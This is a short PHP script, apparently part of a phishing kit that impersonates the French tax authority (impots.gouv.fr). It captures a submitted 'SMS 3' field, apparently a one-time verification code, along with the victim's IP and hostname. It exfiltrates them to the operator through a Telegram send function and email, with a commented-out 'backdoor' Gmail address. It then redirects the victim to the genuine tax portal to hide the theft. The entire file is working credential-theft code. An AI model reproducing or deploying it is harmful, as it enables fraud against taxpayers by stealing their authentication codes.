<?php
$ip = getenv("REMOTE_ADDR");
include_once 'functions.php';	
$hostname = gethostbyaddr($ip);
$message .= "|-------|\n";
$message .= " SMS 3  : ".$_POST['o8']."\n";
$message .= "|-------|\n";
//$send = "backdoorx10x20@gmail.com";
$subject = "IMP:  $ip";
telegram_send(urlencode($message));
{
mail("$send", "$subject", $message);
}
header("Location:https://www.impots.gouv.fr/portail/professionnel/");
?>